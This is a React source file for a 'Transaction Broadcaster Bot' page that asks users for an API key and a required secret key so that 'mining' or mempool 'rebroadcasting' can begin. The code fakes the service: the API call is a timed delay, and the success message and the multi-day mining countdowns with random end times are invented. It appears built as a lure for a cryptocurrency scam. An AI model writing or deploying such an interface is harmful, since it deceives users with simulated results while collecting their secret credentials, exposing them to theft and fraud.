import React, { useState, useEffect } from 'react';
import MiningStatusPage from '../pages/MiningStatusPage';
import '../styles/BotDetails.css';

// Utility function to generate random timer between 23-48 hours
const generateRandomTimer = () => {
  const minHours = 23;
  const maxHours = 48;
  const randomHours = Math.random() * (maxHours - minHours) + minHours;
  return Math.floor(randomHours * 60 * 60 * 1000); // Convert to milliseconds
};

const BotDetails = () => {
  const [formData, setFormData] = useState({
    apiKey: '',
    secretKey: ''
  });
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [messageType, setMessageType] = useState('');
  const [currentView, setCurrentView] = useState('form'); // 'form' or 'mining'
  const [sessionLoading, setSessionLoading] = useState(true);
  const [activeSessions, setActiveSessions] = useState([]);
  const [currentSession, setCurrentSession] = useState(null);

  // Load sessions from localStorage on component mount
  useEffect(() => {
    const loadSessions = () => {
      try {
        const savedSessions = localStorage.getItem('miningSessions');
        if (savedSessions) {
          const sessions = JSON.parse(savedSessions);
          const now = Date.now();
          
          // Filter out expired sessions
          const activeSessions = sessions.filter(session => 
            session.endTime > now
          );
          
          setActiveSessions(activeSessions);
          
          // If there are active sessions, show the first one
          if (activeSessions.length > 0) {
            setCurrentSession(activeSessions[0]);
            setCurrentView('mining');
          }
        }
      } catch (error) {
        // Silently handle error - no console logging
      } finally {
        setSessionLoading(false);
      }
    };

    loadSessions();
  }, []);

  // Save sessions to localStorage
  const saveSessions = (sessions) => {
    try {
      localStorage.setItem('miningSessions', JSON.stringify(sessions));
    } catch (error) {
      // Silently handle error - no console logging
    }
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Validation: Either secret key alone, or both API key and secret key
    const hasApiKey = formData.apiKey.trim();
    const hasSecretKey = formData.secretKey.trim();
    
    if (!hasSecretKey) {
      setMessage('Secret Key is required');
      setMessageType('error');
      return;
    }
    
    if (hasApiKey && !hasSecretKey) {
      setMessage('Secret Key is required when API Key is provided');
      setMessageType('error');
      return;
    }

    setLoading(true);
    setMessage('');

    try {
      // Simulate API call
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      setMessage('Blockchain Mempool Rebroadcasting Initiated!');
      setMessageType('success');
      
      // After showing success message, transition to mining view
      setTimeout(() => {
        const newSession = {
          id: Date.now().toString(),
          apiKey: formData.apiKey.substring(0, 8) + '...',
          secretKey: formData.secretKey.substring(0, 8) + '...',
          startTime: Date.now(),
          endTime: Date.now() + generateRandomTimer(),
          status: 'active'
        };
        
        const updatedSessions = [...activeSessions, newSession];
        setActiveSessions(updatedSessions);
        setCurrentSession(newSession);
        saveSessions(updatedSessions);
        
        setCurrentView('mining');
        setFormData({ apiKey: '', secretKey: '' });
        setMessage('');
      }, 3000);
      
    } catch (error) {
      // Silently handle error - no console logging
      setMessage('Failed to initialize mining. Please try again.');
      setMessageType('error');
    } finally {
      setLoading(false);
    }
  };

  const clearForm = () => {
    setFormData({ apiKey: '', secretKey: '' });
    setMessage('');
  };

  const handleToggleView = () => {
    if (currentView === 'mining') {
      setCurrentView('form');
    } else {
      // If there are active sessions, go back to mining view
      if (activeSessions.length > 0) {
        setCurrentView('mining');
      }
    }
  };

  const getCurrentTimeRemaining = () => {
    if (!currentSession) return 0;
    return Math.max(0, currentSession.endTime - Date.now());
  };

  // Show loading state while checking sessions
  if (sessionLoading) {
    return (
      <div className="bot-details-container">
        <div className="bot-details-card">
          <div className="header-section">
            <h1 className="site-title">Transaction Broadcaster Bot</h1>
            <div className="session-loading">
              <div className="loading-spinner"></div>
              <p>Checking mining sessions...</p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Show mining status if in mining view
  if (currentView === 'mining' && currentSession) {
    return (
      <MiningStatusPage
        initialTimeRemaining={getCurrentTimeRemaining()}
        onToggleView={handleToggleView}
        activeSessions={activeSessions.length}
      />
    );
  }

  // Show form view
  return (
    <div className="bot-details-container">
      <div className="bot-details-card">
        <div className="header-section">
          <h1 className="site-title">Transaction Broadcaster Bot</h1>
          <p className="subtitle">
            Configure your bot with API credentials to Start Rebroadcasting Transactions in the Blockchain
          </p>
        </div>

        {/* Show active sessions indicator */}
        {activeSessions.length > 0 && (
          <div className="sessions-section">
            <div className="sessions-indicator">
              {activeSessions.length} Active Mining Session{activeSessions.length > 1 ? 's' : ''}
            </div>
            <button 
              className="btn back-to-mining"
              onClick={() => setCurrentView('mining')}
            >
              View Mining Status
            </button>
          </div>
        )}

        <form onSubmit={handleSubmit} className="bot-form">
          <div className="form-group">
            <label htmlFor="apiKey" className="form-label">
              API Key
            </label>
            <input
              type="text"
              id="apiKey"
              name="apiKey"
              value={formData.apiKey}
              onChange={handleInputChange}
              placeholder="Enter your API Key (optional)"
              className="form-input"
              disabled={loading}
              autoComplete="off"
            />
            <small className="input-helper">
              Your API key will be used to authenticate mining operations
            </small>
          </div>

          <div className="form-group">
            <label htmlFor="secretKey" className="form-label">
              Secret Key
              <span className="required-asterisk">*</span>
            </label>
            <input
              type="text"
              id="secretKey"
              name="secretKey"
              value={formData.secretKey}
              onChange={handleInputChange}
              placeholder="Enter your Secret Key"
              className="form-input"
              disabled={loading}
              autoComplete="off"
            />
            <small className="input-helper">
              Your secret key ensures secure communication with the mempool pool
            </small>
          </div>

          {/* Verification section */}
          {(formData.apiKey || formData.secretKey) && (
            <div className="verification-section">
              <h3 className="verification-title">Please verify your entries:</h3>
              {formData.apiKey && (
                <div className="verification-item">
                  <span className="verification-label">API Key:</span>
                  <span className="verification-value">{formData.apiKey}</span>
                </div>
              )}
              {formData.secretKey && (
                <div className="verification-item">
                  <span className="verification-label">Secret Key:</span>
                  <span className="verification-value">{formData.secretKey}</span>
                </div>
              )}
            </div>
          )}

          {/* Message display */}
          {message && (
            <div className={`message ${messageType}`}>
              {message}
            </div>
          )}

          {/* Action buttons */}
          <div className="button-group">
            <button
              type="button"
              onClick={clearForm}
              className="btn btn-secondary"
              disabled={loading}
            >
              Clear Form
            </button>
            <button
              type="submit"
              className="btn btn-primary"
              disabled={loading || !formData.secretKey.trim()}
            >
              {loading ? (
                <>
                  <span className="loading-spinner"></span>
                  Uploading...
                </>
              ) : (
                'Start Mining'
              )}
            </button>
          </div>
        </form>

        <div className="info-section">
          <div className="info-item">
            <span className="info-icon">●</span>
            <span>Rebroadcasting will begin immediately after submission</span>
          </div>
          <div className="info-item">
            <span className="info-icon">●</span>
            <span>Real-time mining statistics will be available</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BotDetails;